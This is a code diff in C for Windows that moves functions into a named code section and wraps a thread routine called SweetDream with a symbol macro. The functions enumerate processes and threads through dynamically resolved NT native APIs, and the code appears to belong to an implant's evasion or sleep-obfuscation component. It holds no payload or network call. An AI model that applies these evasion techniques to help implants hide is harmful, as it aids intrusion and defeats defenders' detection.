@@ -6,7 +6,7 @@ typedef struct _EnumThreadsAPI {
 	NtOpenThread_t NtOpenThread;
 } EnumThreadsAPI;
 
-DWORD _sdEnumerateThreads(ULONG ulCounter, SYSTEM_PROCESS_INFORMATION* ProcessInfo, SYSTEM_THREAD_INFORMATION* LatestThread, PBYTE StartMod, PBYTE EndMod, EnumThreadsAPI* api) {
+D_SEC( B ) DWORD _sdEnumerateThreads(ULONG ulCounter, SYSTEM_PROCESS_INFORMATION* ProcessInfo, SYSTEM_THREAD_INFORMATION* LatestThread, PBYTE StartMod, PBYTE EndMod, EnumThreadsAPI* api) {
 	HANDLE hThread = NULL;
 	SYSTEM_THREAD_INFORMATION* thread = nullptr;
 	PVOID pStartAddr = nullptr;
@@ -43,7 +43,7 @@ DWORD _sdEnumerateThreads(ULONG ulCounter, SYSTEM_PROCESS_INFORMATION* ProcessIn
 	return _sdEnumerateThreads(ulCounter + 1, ProcessInfo, LatestThread, StartMod, EndMod, api);
 }
 
-DWORD sdEnumerateThreads(SYSTEM_PROCESS_INFORMATION* ProcessInfo, PBYTE StartMod, PBYTE EndMod) {
+D_SEC( B ) DWORD sdEnumerateThreads(SYSTEM_PROCESS_INFORMATION* ProcessInfo, PBYTE StartMod, PBYTE EndMod) {
 	EnumThreadsAPI api{};
 	PVOID hNtDll = sdGetModuleHandle(NTDLL);
 	api.NtClose = (NtClose_t)sdGetProcAddress(hNtDll, NT_CLOSE);
@@ -52,7 +52,7 @@ DWORD sdEnumerateThreads(SYSTEM_PROCESS_INFORMATION* ProcessInfo, PBYTE StartMod
 	return _sdEnumerateThreads(0, ProcessInfo, nullptr, StartMod, EndMod, &api);
 }
 
-SYSTEM_PROCESS_INFORMATION* sdEnumerateProcesses(SYSTEM_PROCESS_INFORMATION* ProcessInfo) {
+D_SEC( B ) SYSTEM_PROCESS_INFORMATION* sdEnumerateProcesses(SYSTEM_PROCESS_INFORMATION* ProcessInfo) {
 	if ((DWORD)(ULONG_PTR)ProcessInfo->UniqueProcessId == CurrentPID) {
 		return ProcessInfo;
 	}
@@ -63,7 +63,7 @@ SYSTEM_PROCESS_INFORMATION* sdEnumerateProcesses(SYSTEM_PROCESS_INFORMATION* Pro
 	return sdEnumerateProcesses(ProcessInfo);
 }
 
-DWORD GetLastTID(VOID) {
+D_SEC( B ) DWORD GetLastTID(VOID) {
 	PVOID hNtDll = sdGetModuleHandle(NTDLL);
 	NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)sdGetProcAddress(hNtDll, NT_QUERY_SYSTEM_INFO);
 	NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)sdGetProcAddress(hNtDll, NT_QUERY_INFO_THREAD);
@@ -129,7 +129,7 @@ DWORD GetLastTID(VOID) {
 	return tid;
 }
 
-LRESULT CALLBACK WindowMessageReceiveRoutine(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) {
+D_SEC( B ) LRESULT CALLBACK WindowMessageReceiveRoutine(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) {
 	PVOID hNtDll = sdGetModuleHandle(NTDLL);
 	PVOID hUser32Dll = sdGetModuleHandle(USER32);
 	PostMessageW_t PostMsgW = (PostMessageW_t)sdGetProcAddress(hUser32Dll, U_POST_MESSAGE_W);
@@ -194,7 +194,7 @@ LRESULT CALLBACK WindowMessageReceiveRoutine(HWND hWnd, UINT Msg, WPARAM wParam,
 			else {
 				HANDLE hThread = NULL;
 				NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)sdGetProcAddress(hNtDll, NT_CREATE_THREAD_EX);
-				status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, ((HANDLE)-1), (PUSER_THREAD_START_ROUTINE)SweetDream, (PVOID)hWnd, FALSE, 0, 0, 0, NULL);
+				status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, ((HANDLE)-1), (PUSER_THREAD_START_ROUTINE)G_SYM( SweetDream ), (PVOID)hWnd, FALSE, 0, 0, 0, NULL);
 				if (status != STATUS_SUCCESS) {
 					PostMsgW(hWnd, WM_DESTROY, 0, 0);
 				}
